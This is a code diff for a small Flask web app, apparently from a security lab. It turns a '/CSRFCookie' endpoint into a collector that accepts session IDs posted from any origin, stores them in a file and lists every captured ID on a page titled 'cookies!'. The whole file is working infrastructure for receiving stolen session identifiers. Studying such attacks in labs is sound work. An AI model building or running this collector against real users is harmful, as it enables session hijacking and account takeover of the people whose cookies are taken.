@@ -1,31 +1,39 @@
-from flask import Flask, request, redirect, url_for, render_template_string, make_response
+from flask import Flask, request, render_template_string, make_response
 from flask_cors import CORS, cross_origin
 
 app = Flask(__name__)
-CORS(app, resources={r"/*": {"origins": "http://localhost:5050"}})  # Only allow requests from port 5000
-# app.config['CORS_HEADERS'] = 'Content-Type'
+CORS(app, resources={r"/*": {"origins": "http://localhost:5000"}})
 
+def read_session_ids():
+    try:
+        with open('session.txt', 'r') as f:
+            session_ids = f.read().splitlines()
+    except FileNotFoundError:
+        session_ids = []
+    return session_ids
+
+def write_session_ids(session_ids):
+    with open('session.txt', 'w') as f:
+        for session_id in session_ids:
+            f.write(f"{session_id}\n")
 
 @app.route('/CSRFCookie', methods=['POST'])
-# @cross_origin()
 def csrf_cookie():
     session_id = request.form.get('session_id')
-    if session_id:
-        with open('session.txt', 'w') as f:
-            f.write(session_id)
+    session_ids = read_session_ids()
+    
+    if session_id and session_id not in session_ids:
+        session_ids.append(session_id)
+        write_session_ids(session_ids)
     
     response = make_response()
     response.headers.add("Access-Control-Allow-Origin", "*")
     return response
-            
+
 @app.route('/')
 @cross_origin()
 def home():
-    try:
-        with open('session.txt', 'r') as f:
-            session_id = f.readline()
-    except FileNotFoundError:
-        session_id = "No session ID set"
+    session_ids = read_session_ids()
     
     html = """
     <!DOCTYPE html>
@@ -44,12 +52,17 @@ def home():
     <body>
       <h1>cookies!</h1>
       <img src='/static/cookie.png' width='256' height='256'>
-      <p>Session ID: {{ session_id }}</p>
+      <p>Session IDs:</p>
+      <ul>
+        {% for session_id in session_ids %}
+          <li>{{ session_id }}</li>
+        {% endfor %}
+      </ul>
     </body>
     </html>
     """
     
-    return render_template_string(html, session_id=session_id)
+    return render_template_string(html, session_ids=session_ids)
 
 if __name__ == '__main__':
     app.run(port=8080)
